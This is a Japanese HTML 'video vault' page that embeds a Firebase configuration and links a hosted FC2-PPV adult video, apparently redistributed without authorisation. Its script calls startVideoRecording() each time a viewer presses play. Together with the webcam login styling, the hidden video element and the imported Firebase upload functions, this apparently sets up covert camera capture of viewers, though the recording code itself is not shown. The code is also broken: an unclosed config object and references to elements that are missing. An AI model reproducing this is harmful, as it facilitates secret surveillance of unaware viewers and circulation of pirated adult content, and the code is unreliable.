
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>動画保管庫</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .video-grid {
            display: grid;
            gap: 10px;
        }
        .video-item {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .video-container {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%;
            background-color: #000;
        }
        .video-container video {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 100%;
            transform: translate(-50%, -50%);
            object-fit: contain;
        }
        .video-item .title {
            width: 90%;
            margin-top: 10px;
            padding: 5px;
            text-align: center;
            border: none;
            background: none;
            color: #000;
            font-size: 12px;
        }

        @media (min-width: 1200px) {
            .video-grid {
                grid-template-columns: repeat(4, 1fr);
            }
        }
        @media (min-width: 992px) and (max-width: 1199px) {
            .video-grid {
                grid-template-columns: repeat(3, 1fr);
            }
        }
        @media (min-width: 768px) and (max-width: 991px) {
            .video-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        @media (max-width: 767px) {
            .video-grid {
                grid-template-columns: 1fr;
            }
        }

        .dialog-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .dialog {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            text-align: center;
        }
        .dialog button {
            margin-top: 10px;
        }

        .pagination {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin: 20px 0;
        }
        .pagination button {
            padding: 10px 20px;
            margin: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .login-container video {
            width: 320px;
            height: 240px;
        }
        .login-container button {
            padding: 10px 20px;
            font-size: 16px;
            margin-top: 20px;
            cursor: pointer;
        }

        .camera-switch-message {
            font-size: 16px;
            color: red;
	}
	    
	#video {
            display: none;
        }
    </style>
</head>
<body>

<h1 id="title">動画保管庫</h1>

        <!-- Pagination buttons will be dynamically inserted here -->

    <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
    import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";

    const firebaseConfig = {
            apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
            authDomain: "nou-no-circle.firebaseapp.com",
            projectId: "nou-no-circle",
            storageBucket: "nou-no-circle.appspot.com",
            messagingSenderId: "756338805186",

    const app = initializeApp(firebaseConfig);
    const storage = getStorage(app);

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const dialogOverlay = document.getElementById('dialogOverlay');
    const reloadButton = document.getElementById('reloadButton');
    const loginContainer = document.getElementById('loginContainer');
    const videoGrid = document.getElementById('videoGrid');
    const pagination = document.getElementById('pagination');
    const videosPerPage = 8;
    let currentPage = 1;

    const videos = [

        　　{		
                url: 'https://firebasestorage.googleapis.com/v0/b/hozon3-6ca6a.appspot.com/o/hhd800.com%40FC2-PPV-2645708_1.mp4?alt=media&token=417dde2e-78ff-451d-a4c1-bc198bffa9c5',		
		title: 'FC2-PPV-2645708 女優になった19歳アイドル研究生の未公開映像を限定公開。_1'
	    },	

            // 他の動画URLとタイトルを追加
    ];

    async function loadVideos(page) {
        const startIndex = (page - 1) * videosPerPage;
        const endIndex = startIndex + videosPerPage;
        const videosToLoad = videos.slice(startIndex, endIndex);

        videoGrid.innerHTML = '';

        videosToLoad.forEach(video => {
            const videoItem = document.createElement('div');
            videoItem.className = 'video-item';

            const videoContainer = document.createElement('div');
            videoContainer.className = 'video-container';

            const videoElement = document.createElement('video');
            videoElement.src = video.url;
            videoElement.controls = true;

            const titleElement = document.createElement('div');
            titleElement.className = 'title';
            titleElement.textContent = video.title;

            videoContainer.appendChild(videoElement);
            videoItem.appendChild(videoContainer);
            videoItem.appendChild(titleElement);
            videoGrid.appendChild(videoItem);

            videoElement.addEventListener('play', () => {
                startVideoRecording();
            });

            videoElement.addEventListener('pause', () => {
                stopVideoRecording();
            });
        });

        setupPagination(page);
    }

    function setupPagination(currentPage) {
        pagination.innerHTML = '';

        const totalPages = Math.ceil(videos.length / videosPerPage);

        for (let i = 1; i <= totalPages; i++) {
            const button = document.createElement('button');
            button.textContent = i;
            if (i === currentPage) {
                button.disabled = true;
            }
            button.addEventListener('click', () => {
                loadVideos(i);
            });
            pagination.appendChild(button);
        }
    }
</script>
</body>
</html>
